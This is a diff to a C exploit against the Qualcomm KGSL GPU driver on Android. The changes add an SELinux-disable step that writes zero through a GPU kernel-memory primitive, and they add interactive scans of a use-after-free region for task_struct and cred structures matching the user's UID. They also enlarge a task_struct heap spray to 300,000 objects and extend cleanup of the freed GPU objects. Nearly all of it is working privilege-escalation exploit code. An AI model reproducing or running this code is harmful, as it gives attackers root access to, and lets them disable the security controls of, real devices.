@@ -971,6 +971,14 @@ static int disable_selinux_via_gpu(int fd)
     if (selinux_enforcing == 0)
         return -1;
 
+    uint32_t current_val = 1;
+    if (gpu_read_u32(fd, selinux_enforcing, &current_val) == 0) {
+        if (current_val == 0) {
+            fprintf(stderr, "[SELINUX] Already disabled (0) at 0x%lx\n", (unsigned long)selinux_enforcing);
+            return 0;
+        }
+    }
+
     fprintf(stderr, "[SELINUX] Writing 0 to 0x%lx via GPU\n", (unsigned long)selinux_enforcing);
     uint32_t zero_val = 0;
     if (gpu_write_bytes(fd, selinux_enforcing, &zero_val, sizeof(zero_val)) != 0)
@@ -1709,9 +1717,9 @@ static int find_marker_in_page(uint8_t *page_data, size_t page_size, uint64_t cu
 }
 
 static void hex_dump_internal(const char *desc, uint64_t addr, uint8_t *data, size_t size) {
-    fprintf(stderr, "    --- %s at 0x%lx ---\n", desc, (unsigned long)addr);
+    fprintf(stderr, "--- %s at 0x%lx ---\n", desc, (unsigned long)addr);
     for (size_t i = 0; i < size; i += 16) {
-        fprintf(stderr, "    %04lx: ", (unsigned long)i);
+        fprintf(stderr, "%04x: ", (unsigned int)i);
         for (size_t j = 0; j < 16; j++) {
             if (i + j < size) fprintf(stderr, "%02x ", data[i + j]);
             else fprintf(stderr, "   ");
@@ -1725,7 +1733,7 @@ static void hex_dump_internal(const char *desc, uint64_t addr, uint8_t *data, si
         }
         fprintf(stderr, "\n");
     }
-    fprintf(stderr, "    ---------------------------------\n");
+    fprintf(stderr, "---------------------------------\n");
 }
 
 static int scan_uaf_for_nonzero_multi(int fd, int batch_idx, int *num_found)
@@ -1851,7 +1859,7 @@ static int scan_uaf_for_nonzero_multi(int fd, int batch_idx, int *num_found)
                 int user_decision = 0;
                 while (!user_decision) {
                     fprintf(stderr, "\n    [>] Candidate PID %d at 0x%lx (Offset 0x%x)\n", found_pid, (unsigned long)task_start_va, off);
-                    fprintf(stderr, "    [>] Actions: [y] Use, [n] Skip, [1] Dump Task, [2] Dump CRED, [3] Custom Offset Dump: ");
+                    fprintf(stderr, "    [>] Actions: [y] Use, [n] Skip, [1] Dump Task, [2] Dump CRED, [3] Custom, [4] Pages, [5] Scan neighbors, [6] Full Task, [7] Find all PIDs, [8] Global CRED Scan: ");
                     fflush(stderr);
                     
                     char choice = 0;
@@ -1898,7 +1906,7 @@ static int scan_uaf_for_nonzero_multi(int fd, int batch_idx, int *num_found)
                             }
                         } else if (choice == '5') {
                             uid_t my_uid = getuid();
-                            fprintf(stderr, "    [*] Searching for CRED (UID %u) in GPU space...\n", my_uid);
+                            fprintf(stderr, "    [*] Searching for CRED (UID %u) in GPU space (1024 pages window)...\n", my_uid);
                             int found = 0;
                             for (int p = -512; p <= 512; p++) {
                                 uint64_t pva = current_va + p * PAGE_SIZE;
@@ -1906,23 +1914,64 @@ static int scan_uaf_for_nonzero_multi(int fd, int batch_idx, int *num_found)
                                 if (gpu_read_task_struct(fd, pva, (uint8_t *)check, 64) == 0) {
                                     for (int off_in_page = 0; off_in_page < 64 - 12; off_in_page += 4) {
                                         uint32_t *ptr = (uint32_t *)((uint8_t *)check + off_in_page);
-                                        if (ptr[0] > 0 && ptr[0] < 50 && ptr[1] == my_uid && ptr[1] == ptr[2]) {
-                                            fprintf(stderr, "    [+++] MATCH FOUND at GPU VA 0x%lx + 0x%x (UID %u)\n", 
-                                                    (unsigned long)pva, off_in_page, ptr[1]);
+                                        if (ptr[0] > 0 && ptr[0] < 200 && ptr[1] == my_uid && ptr[1] == ptr[2]) {
+                                            fprintf(stderr, "    [+++] MATCH FOUND at GPU VA 0x%lx + 0x%x (UID %u, usage %u)\n", 
+                                                    (unsigned long)pva, off_in_page, ptr[1], ptr[0]);
                                             found_cred_ptr = pva + off_in_page;
                                             found = 1; break;
                                         }
                                     }
                                 }
                                 if (found) break;
+                                if (p % 128 == 0) fprintf(stderr, ".");
                             }
-                            if (!found) fprintf(stderr, "    [-] No CRED-like structures found for UID %u.\n", my_uid);
+                            if (!found) fprintf(stderr, "\n    [-] No CRED-like structures found in neighbors.\n");
                         } else if (choice == '6') {
                             fprintf(stderr, "    --- FULL task_struct Dump (4KB) at 0x%lx ---\n", (unsigned long)task_start_va);
                             uint8_t full_task[4096];
                             if (gpu_read_task_struct(fd, task_start_va, full_task, 4096) == 0) {
                                 hex_dump_internal("FULL task_struct", task_start_va, full_task, 4096);
                             }
+                        } else if (choice == '7') {
+                            fprintf(stderr, "    [*] Finding all markers in UAF range...\n");
+                            uint64_t scan_start = UAF_START;
+                            uint64_t scan_end = UAF_START + UAF_SIZE;
+                            int found_cnt = 0;
+                            for (uint64_t pva = scan_start; pva < scan_end; pva += PAGE_SIZE) {
+                                uint8_t page[4096];
+                                if (gpu_read_task_struct(fd, pva, page, 4096) == 0) {
+                                    pid_t fpid = 0;
+                                    if (find_marker_in_page(page, 4096, pva, &fpid)) {
+                                        fprintf(stderr, "    [+] Found PID %d at 0x%lx\n", fpid, (unsigned long)pva);
+                                        found_cnt++;
+                                    }
+                                }
+                                if (((pva - scan_start) / PAGE_SIZE) % 2048 == 0) fprintf(stderr, ".");
+                            }
+                            fprintf(stderr, "\n    [*] Done. Found %d total markers.\n", found_cnt);
+                        } else if (choice == '8') {
+                            uid_t my_uid = getuid();
+                            fprintf(stderr, "    [*] GLOBAL SCAN for CRED (UID %u) in UAF Range...\n", my_uid);
+                            uint64_t scan_start = UAF_START;
+                            uint64_t scan_end = UAF_START + UAF_SIZE;
+                            int found = 0;
+                            for (uint64_t pva = scan_start; pva < scan_end; pva += PAGE_SIZE) {
+                                uint32_t check[16];
+                                if (gpu_read_task_struct(fd, pva, (uint8_t *)check, 64) == 0) {
+                                    for (int off_in_page = 0; off_in_page < 64 - 12; off_in_page += 4) {
+                                        uint32_t *ptr = (uint32_t *)((uint8_t *)check + off_in_page);
+                                        if (ptr[0] > 0 && ptr[0] < 200 && ptr[1] == my_uid && ptr[1] == ptr[2]) {
+                                            fprintf(stderr, "\n    [+++] GLOBAL MATCH at 0x%lx + 0x%x (UID %u, usage %u)\n", 
+                                                    (unsigned long)pva, off_in_page, ptr[1], ptr[0]);
+                                            found_cred_ptr = pva + off_in_page;
+                                            found = 1; break;
+                                        }
+                                    }
+                                }
+                                if (found) break;
+                                if (((pva - scan_start) / PAGE_SIZE) % 2048 == 0) fprintf(stderr, ".");
+                            }
+                            if (!found) fprintf(stderr, "\n    [-] Not found in UAF range.\n");
                         }
                     }
                 }
@@ -2607,8 +2656,8 @@ restart:;
         fprintf(stderr, "    [!] Failed to free UAF: %s\n", strerror(errno));
     }
 
-    fprintf(stderr, "\n[11] Batch Spraying task_struct (Target: 200,000)\n");
-    int total_limit = 200000;
+    fprintf(stderr, "\n[11] Batch Spraying task_struct (Target: 300,000)\n");
+    int total_limit = 300000;
     int batch_size = 5000; // Увеличили батч для максимально плотного спрея
     int total_sprayed = 0;
     int marker_found_global = 0;
@@ -2772,11 +2821,24 @@ restart:;
             munmap(g_uaf_mmap_ptr, g_uaf_mmapsize);
             g_uaf_mmap_ptr = NULL;
         }
+        if (overlap_vma && overlap_vma != MAP_FAILED) munmap(overlap_vma, overlap_mmapsize);
+        if (ph_vma && ph_vma != MAP_FAILED) munmap(ph_vma, ph_mmapsize);
+        if (bogus_vma && bogus_vma != MAP_FAILED) munmap(bogus_vma, PAGE_SIZE * 3);
+        
+        struct kgsl_gpuobj_free fr = {0};
         if (g_uaf_id > 0) {
-            struct kgsl_gpuobj_free fr = {.id = g_uaf_id};
+            fr.id = g_uaf_id;
             ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr);
-            g_uaf_id = 0;
         }
+        if (overlap_id) {
+            fr.id = overlap_id;
+            ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr);
+        }
+        if (ph_id) {
+            fr.id = ph_id;
+            ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr);
+        }
+        
         close(fd);
         fd = -1;
     }
